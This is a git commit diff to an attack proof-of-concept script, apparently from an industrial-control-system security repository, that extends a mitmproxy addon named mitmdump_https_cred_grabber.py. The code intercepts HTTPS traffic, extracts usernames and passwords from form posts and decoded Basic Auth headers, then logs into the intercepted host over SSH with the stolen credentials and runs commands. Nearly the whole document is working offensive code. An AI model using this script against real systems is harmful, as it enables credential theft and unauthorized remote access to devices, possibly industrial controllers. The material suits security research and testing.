c5fa1d07663ef9893e5c692251fe4425cecb2b87
cutaway <cutawaysecurity@gmail.com>
2022-02-07 16:02:46 -0600

    Added Basic Auth Processing

--- ics/attack-poc-scripts/mitmdump_https_cred_grabber.py
+++ ics/attack-poc-scripts/mitmdump_https_cred_grabber.py
@@ -1,4 +1,4 @@
-import sys
+import sys, base64
 from mitmproxy import http
 import paramiko
 
@@ -23,10 +23,16 @@ SSH_CONNECT = False
 #SSH_CONNECT = True
 
 class GetRTUCreds:
-    localhost = '127.0.0.1'
-
+    
+    #Process HTTPS Request
     def request(self,flow: http.HTTPFlow):
+        u = ''
+        p = ''
+        h = ''
+        # Form-based Authentication
         if flow.request.method == "POST":
+            # NOTE: The form variables MUST be modified to match form fields
+            #       Use 'mitmdump -w <file>' and 'mitmdump -r <file>' to troubleshoot
             # NOTE: Use the following to print the contents of the request
             if DEBUG: print("%s"%(flow.request.urlencoded_form))
             # NOTE: Use the following to print the help for urlencoded_form methods
@@ -34,34 +40,51 @@ class GetRTUCreds:
             form = flow.request.urlencoded_form
             u = form.get('username')
             p = form.get('password')
-            if u and p:
-                if DEBUG: print("# Detected authentication via HTTPS.")
-                print("%s:%s"%(u,p))
-                if SSH_CONNECT: self.ssh_connect(username=u,password=p)
+            h = flow.request.headers['Host']
+        # Basic Authentication
+        if flow.request.method == "GET":
+            h = flow.request.headers['Host']
+            atype,creds = flow.request.headers['Authorization'].split()
+            if DEBUG: print("Host: %s Type: %s Creds: %s"%(h,atype,creds))
+            u,p = self.basic_auth_decode(creds)
+            if DEBUG: print("Username %s : Password %s"%(u,p))
+        # Attack Via SSH
+        if SSH_CONNECT and h and u and p:
+            if DEBUG: print("Attacking %s:%s:%s"%(h,u,p))
+            self.ssh_connect(server=h,username=u,password=p)
 
-    def ssh_connect(self, username, password):
+    # Decode Basic Authentication Base64 Encoded Credentials
+    def basic_auth_decode(self, data):
+        return base64.b64decode(data).decode('ascii').split(':',1)
+
+    # Connect to SSH server using captured credentials
+    def ssh_connect(self, server, username, password):
         if DEBUG: print("# Attempting to ssh connect.")
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
-            client.connect(hostname=self.localhost, username=username, password=password)
+            client.connect(hostname=server, username=username, password=password)
         except:
             print("SSH: Unable to connect to client at %s"%(self.localhost))
             client.close()
             sys.exit()
 
+        # Run commands after connecting via SSH
         if DEBUG: print("# Attempting to run commands.")
+        # NOTE: Update commands to run here. Results will be printed to terminal
         cmds = ['hostname','uname -a','id']
         for c in cmds:
             try: 
                 stdin, stdout, stderr = client.exec_command(c)
-                if stdout: out = stdout.read().decode().strip()
-                # Don't need these, but keep in case needed for debugging
+                if stdout: 
+                    out = stdout.read().decode().strip()
+                    print("Result: %s"%(out))
                 #if stdin: sin = stdin.read().decode().strip()
-                #if stderr: err = stderr.read().decode().strip()
-                print("Result: %s"%(out))
+                if stderr: 
+                    err = stderr.read().decode().strip()
+                    print("Result: %s"%(err))
             except:
-                print('Cmd Failed: %s'%s(c))
+                print('Cmd Failed: %s'%(c))
         client.close() 
 
 addons = [GetRTUCreds()]
